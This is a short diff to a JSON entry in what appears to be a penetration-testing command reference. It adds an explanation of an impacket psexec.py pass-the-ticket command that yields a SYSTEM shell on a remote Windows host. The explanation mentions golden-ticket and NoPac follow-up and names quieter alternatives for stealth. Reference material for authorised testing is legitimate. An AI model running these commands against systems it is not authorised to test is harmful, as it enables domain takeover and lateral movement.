@@ -105,5 +105,6 @@
       "label": "Get a shell with the ticket",
       "command": "psexec.py -k -no-pass <domain>/<user>@<target_fqdn> -target-ip <target_ip>"
     }
-  ]
+  ],
+  "explain": "Gets a SYSTEM shell on a remote host using a Kerberos ticket (pass-the-ticket):\n  psexec.py                impacket's service-based remote execution\n  <domain>/<user>@<target_fqdn>   the account and target (FQDN required for Kerberos)\n  -k                       authenticate with the ticket in KRB5CCNAME\n  -no-pass                 do not prompt for a password\n  -target-ip <target_ip>   resolve the host to this IP\nUsed after an ExtraSids golden ticket or NoPac; wmiexec/smbexec are quieter alternatives with the same -k -no-pass."
 }
